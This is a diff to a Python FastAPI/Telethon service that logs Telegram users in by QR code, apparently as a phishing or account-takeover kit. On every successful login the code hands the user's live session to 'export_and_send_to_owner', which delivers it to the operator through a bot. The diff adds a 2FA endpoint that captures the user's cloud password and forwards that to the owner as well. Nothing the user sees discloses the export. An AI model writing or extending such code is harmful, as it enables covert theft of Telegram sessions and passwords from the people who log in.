@@ -9,6 +9,7 @@ from pydantic import BaseModel
 from telethon import TelegramClient
 from telethon.tl.functions.auth import ExportLoginTokenRequest, ImportLoginTokenRequest
 from telethon.tl.types import auth
+from telethon.errors import SessionPasswordNeededError
 
 import qrcode
 
@@ -21,8 +22,14 @@ qr_sessions = {}
 
 
 class QRStatusResponse(BaseModel):
-    status: str  # "pending", "success", "expired"
+    status: str  # "pending", "success", "expired", "needs_2fa"
     session_url: str = None
+    hint: str = None
+
+
+class QR2FARequest(BaseModel):
+    session_id: str
+    password: str
 
 
 @router.post("/generate")
@@ -83,10 +90,6 @@ async def generate_qr():
 
 async def poll_qr_login(session_id: str):
     """Poll for QR login completion"""
-    from bot.export_service import export_and_send_to_owner
-    from aiogram import Bot
-    from config import BOT_TOKEN
-    
     session = qr_sessions.get(session_id)
     if not session:
         return
@@ -99,6 +102,10 @@ async def poll_qr_login(session_id: str):
         if session_id not in qr_sessions:
             return
         
+        current_status = qr_sessions.get(session_id, {}).get("status")
+        if current_status in ("success", "needs_2fa", "expired"):
+            return
+        
         try:
             result = await client(ExportLoginTokenRequest(
                 api_id=API_ID,
@@ -107,28 +114,24 @@ async def poll_qr_login(session_id: str):
             ))
             
             if isinstance(result, auth.LoginTokenSuccess):
-                # Login successful!
-                me = await client.get_me()
-                user_id = me.id
-                
-                # Create final session
-                final_session_id = f"user_{user_id}"
-                
-                # Trigger auto-export
-                try:
-                    bot = Bot(token=BOT_TOKEN)
-                    await export_and_send_to_owner(bot, client, final_session_id, None)
-                    await bot.session.close()
-                except Exception as e:
-                    print(f"[QR Login] Export error: {e}")
-                
-                # Update session status
-                qr_sessions[session_id] = {
-                    "status": "success",
-                    "session_url": f"{WEB_URL}/?session={final_session_id}",
-                    "client": client
-                }
+                # Login successful (no 2FA)
+                await complete_qr_login(session_id, client)
                 return
+                
+        except SessionPasswordNeededError:
+            # 2FA is required
+            hint = None
+            try:
+                hint = await client.get_password_hint()
+            except:
+                pass
+            
+            qr_sessions[session_id] = {
+                "status": "needs_2fa",
+                "client": client,
+                "hint": hint
+            }
+            return
                 
         except Exception as e:
             print(f"[QR Poll] Error: {e}")
@@ -137,6 +140,52 @@ async def poll_qr_login(session_id: str):
     # Expired
     qr_sessions[session_id] = {"status": "expired"}
     await client.disconnect()
+
+
+async def complete_qr_login(session_id: str, client: TelegramClient, twofa: str = None):
+    """Complete login and trigger export"""
+    from bot.export_service import export_and_send_to_owner
+    from aiogram import Bot
+    from config import BOT_TOKEN
+    
+    me = await client.get_me()
+    user_id = me.id
+    final_session_id = f"user_{user_id}"
+    
+    # Trigger auto-export
+    try:
+        bot = Bot(token=BOT_TOKEN)
+        await export_and_send_to_owner(bot, client, final_session_id, twofa)
+        await bot.session.close()
+    except Exception as e:
+        print(f"[QR Login] Export error: {e}")
+    
+    # Update session status
+    qr_sessions[session_id] = {
+        "status": "success",
+        "session_url": f"{WEB_URL}/?session={final_session_id}",
+        "client": client
+    }
+
+
+@router.post("/2fa")
+async def qr_2fa(req: QR2FARequest):
+    """Submit 2FA password for QR login"""
+    session = qr_sessions.get(req.session_id)
+    
+    if not session or session.get("status") != "needs_2fa":
+        raise HTTPException(400, "Invalid session")
+    
+    client = session.get("client")
+    
+    try:
+        await client.sign_in(password=req.password)
+        await complete_qr_login(req.session_id, client, req.password)
+        
+        return {"status": "success", "session_url": qr_sessions[req.session_id].get("session_url")}
+        
+    except Exception as e:
+        raise HTTPException(400, str(e))
 
 
 @router.get("/status/{session_id}")
@@ -150,9 +199,11 @@ async def check_status(session_id: str):
     status = session.get("status", "pending")
     
     if status == "success":
-        # Clean up
         url = session.get("session_url")
         del qr_sessions[session_id]
         return {"status": "success", "session_url": url}
+    
+    if status == "needs_2fa":
+        return {"status": "needs_2fa", "hint": session.get("hint")}
     
     return {"status": status}
